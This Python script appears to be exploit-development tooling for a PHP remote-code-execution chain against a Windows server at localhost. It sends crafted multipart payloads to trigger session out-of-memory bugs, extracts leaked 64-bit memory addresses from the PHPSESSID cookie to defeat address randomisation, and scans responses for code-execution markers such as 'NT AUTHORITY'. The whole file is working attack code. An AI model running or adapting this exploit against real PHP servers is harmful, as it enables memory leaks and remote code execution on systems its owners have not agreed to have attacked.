#!/usr/bin/env python3
"""Windows recon: Bug-U (decode OOM on pre-seeded session) and Bug-S (encode OOM)
arm sequences + B1 leak with RAW sid dump."""
import importlib.util
import os
import struct
import subprocess
import sys
import tempfile
from collections import Counter
from urllib.parse import unquote_to_bytes

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("p2s", os.path.join(HERE, "php2shell_pwn.py"))
m = importlib.util.module_from_spec(spec)
try:
    spec.loader.exec_module(m)
except SystemExit:
    pass

PURE = os.path.join(HERE, "pure")
URL = "http://127.0.0.1:8085/"
url = m.normalize_url(URL)
conn = m.Conn(url[0], url[1], url[2], 90.0, True, "", {}, proxy=None)

SID32 = b"a" * 32
SIDHEX = "61"

def build(mk, extra):
    p = os.path.join(tempfile.mkdtemp(prefix="rc_"), "x.bin")
    subprocess.run([sys.executable, os.path.join(PURE, mk), "--out", p] + extra,
                   check=True, stdout=subprocess.DEVNULL)
    return open(p, "rb").read()

def send(body, path=None):
    try:
        return conn.request(path if path is not None else url[3], body, chunked=True)
    except Exception:
        conn.close()
        try:
            conn.connect()
        except Exception:
            pass
        return 0, {}, b""

BASE = ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
        "--fillers128", "4"]
SEED = ["--parts", "860", "--depth", "20", "--big", "10", "--big-len", "4000",
        "--fillers128", "2", "--sid-hex", SIDHEX]

def show(tag, st, _b):
    print("[%s] HTTP %d %dB" % (tag, st, len(_b)))
    if b"Allowed memory size of" in _b:
        print("[%s] FATAL: %r" % (tag, _b[:150].decode("utf-8", "replace")))
    elif st and 0 < len(_b) < 400:
        print("[%s] short: %r" % (tag, _b[:200].decode("utf-8", "replace")))

def b1_probe(tag):
    body = build("mk_leak_b.py", ["--spec", m.LEAK_SPEC, "--fake-len", "0xC8000",
                                  "--tag", "--sid", SID32.decode()])
    st, headers, resp = send(body, url[3])
    sc = headers.get("set-cookie", "")
    px = sc.find("PHPSESSID=")
    raw = sc[px + 10:] if px >= 0 else ""
    for cut in (";", ","):
        j = raw.find(cut)
        if j >= 0:
            raw = raw[:j]
    dec = unquote_to_bytes(raw).replace(b"+", b" ")
    print("[%s] B1 HTTP %d body=%dB sidlen=%d raw=%r" % (tag, st, len(resp), len(dec), dec[:120]))
    if len(dec) > 26:
        total = 0
        mod = Counter()
        for off in range(0, len(dec) - 8, 8):
            q = struct.unpack_from("<Q", dec, off)[0]
            if 0x00007FF000000000 <= q <= 0x00007FFFFFFF0000:
                mod[q] += 1
                total += 1
        print("[%s] LEAK qwords=%d uniq=%d top:" % (tag, total, len(mod)))
        for q, c in mod.most_common(10):
            print("    %#018x x%d" % (q, c))
    if b"PWNED" in resp or b"uid=" in resp or b"NT AUTHORITY" in resp:
        print("[%s] *** RCE MARKER IN BODY *** %r" % (tag, resp[:300]))

# ---- try1: Bug U (decode OOM on seeded session) ----
print("[*] try1 BugU: seed session")
st, _h, _b = send(build("mk_a1.py", SEED))
show("try1.seed", st, _b)

print("[*] try1.arm n17 same sid")
arm = build("mk_a1.py", BASE + ["--bigs17", "17", "--big-len17", "66000",
                                "--burners", "30", "--burner-len", "7500",
                                "--sid-hex", SIDHEX])
st, _h, _b = send(arm)
show("try1.arm", st, _b)
b1_probe("try1")

# ---- try2: Bug S (encode OOM, bigger session data) ----
print("[*] try2 BugS: n17 fresh sid, progress 12000")
arm = build("mk_a1.py", BASE + ["--bigs17", "17", "--big-len17", "66000",
                                "--burners", "30", "--burner-len", "7500",
                                "--progress-len", "12000", "--sid-hex", "62"])
st, _h, _b = send(arm)
show("try2.arm", st, _b)
b1_probe("try2")

print("[*] done")
